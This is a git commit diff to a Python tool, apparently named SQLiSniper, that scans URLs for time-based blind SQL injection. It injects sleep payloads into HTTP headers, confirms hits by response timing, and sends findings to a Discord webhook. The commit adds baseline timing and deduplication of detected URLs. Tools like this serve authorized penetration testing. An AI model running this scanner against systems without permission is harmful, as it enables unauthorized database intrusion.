6e05752d8425590ce1f0e49a049d64a9f1f5e4f8
Muhammad Danial <149725207+danialhalo@users.noreply.github.com>
2023-11-19 03:06:22 +0500

    Update sqlisniper.py

--- sqlisniper.py
+++ sqlisniper.py
@@ -12,11 +12,13 @@ from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from termcolor import colored
 from colorama import Fore, Style, init
+import time
 
   # Added import for colored text
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
+detected = []
 default_payloads_file = 'payloads.txt'
 default_headers_file = 'headers.txt'
 
@@ -32,43 +34,50 @@ def send_discord_notification(webhook_url, url, header, payload):
 def validate_sql_injection(url, header, payload, discord_webhook=None, proxy=None):
     proxies = {'http': proxy, 'https': proxy} if proxy else None
 
+    if url in detected:
+        return
+
     try:
+
+        normal_header = {h.split(': ')[0]: h.split(': ')[1] for h in [header]}
+        response_normal = requests.get(url, headers=normal_header, verify=False, proxies=proxies)
+        normal_time = response_normal.elapsed.total_seconds()
+        print(colored(f"{Fore.BLUE}[Time Check]{Style.RESET_ALL} {Fore.WHITE} {url} normal response time is {response_normal.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))
+
         # Validate with 15 seconds sleep
         payload_15 = payload.replace("%__TIME_OUT__%", "15")
         headers_15s = {h.split(': ')[0]: h.split(': ')[1] + payload_15 for h in [header]}
-
         response_15s = requests.get(url, headers=headers_15s, verify=False, proxies=proxies)
-        print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Setting sleep time to 15 seconds: Server Response Time is {response_15s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))
-
-
+        print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 15 seconds: {url} Server Response Time is {response_15s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))
 
         if response_15s.elapsed.total_seconds() >= 14:
             payload_5 = payload.replace("%__TIME_OUT__%", "5")
             headers_5s = {h.split(': ')[0]: h.split(': ')[1] + payload_5 for h in [header]}
             response_5s = requests.get(url, headers=headers_5s, verify=False, proxies=proxies)
 
-            print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Setting sleep time to 5 seconds: Server Response Time is {response_5s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))
-
-
-
-            if response_5s.elapsed.total_seconds() < 7:
+            print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 5 seconds: {url} Server Response Time is {response_5s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))
+            if response_5s.elapsed.total_seconds() < response_15s.elapsed.total_seconds()/2+response_normal.elapsed.total_seconds():
 
                 print(colored("~~~", 'green'))
                 print(colored("[CONFIRMED] Time-base Blind Injection verified", 'green', attrs=['bold']))
                 print(colored(f"    Target: {url}\n    Header: {header}\n    Vector: {payload}", 'green'))
                 print(colored("~~~", 'green'))
+                detected.append(url)
                 if discord_webhook:
                     send_discord_notification(discord_webhook, url, headers_15s, payload)
             else:
-                print(colored(f"[False-Positive]  {url} is false positive. Test manually.", 'white'))
+                print(colored(f"[False-Positive]  {url} might be false positive. Test manually.", 'white'))
         else:
-            print(colored(f"[False-Positive]  {url} is false positive. Test manually.", 'white'))
+            print(colored(f"[False-Positive]  {url} is might be false positive. Test manually.", 'white'))
 
     except requests.RequestException as e:
         print(colored(f"[ERROR] An error occurred during validation: {e}", 'red'))
 
 def process_url(url, sql_query, headers, discord_webhook, proxy):
+
     for header in headers:
+        if url in detected:
+            break
         # Modify the payload time for the initial request
         payload = sql_query.replace("%__TIME_OUT__%", "10")
         headers_dict = {h.split(': ')[0]: h.split(': ')[1] + payload for h in [header]}
@@ -79,7 +88,9 @@ def process_url(url, sql_query, headers, discord_webhook, proxy):
             print(colored(f"{header} {payload}", 'white'))
 
             # Validate SQL injection
-            validate_sql_injection(url, header, sql_query, discord_webhook, proxy)
+
+            if url not in detected:
+                validate_sql_injection(url, header, sql_query, discord_webhook, proxy)
 
 def read_headers_from_file(headers_file):
     if not os.path.isfile(headers_file):
@@ -159,8 +170,12 @@ def main():
         start_time = datetime.now()  # Record the start time
         print(colored(f"\n[*] Starting @ {start_time.strftime('%H:%M:%S %Y-%m-%d')}\n\n", 'white'))
         for url in urls:
+            if url in detected:
+                return
             if is_valid_url(url):
                 for sql_query in payloads:
+                    if url in detected:
+                        break
                     executor.submit(process_url, url, sql_query, headers, args.discord, args.proxy)
             else:
                 print(colored(f"[ERROR] Invalid URL: {url}", 'red'))
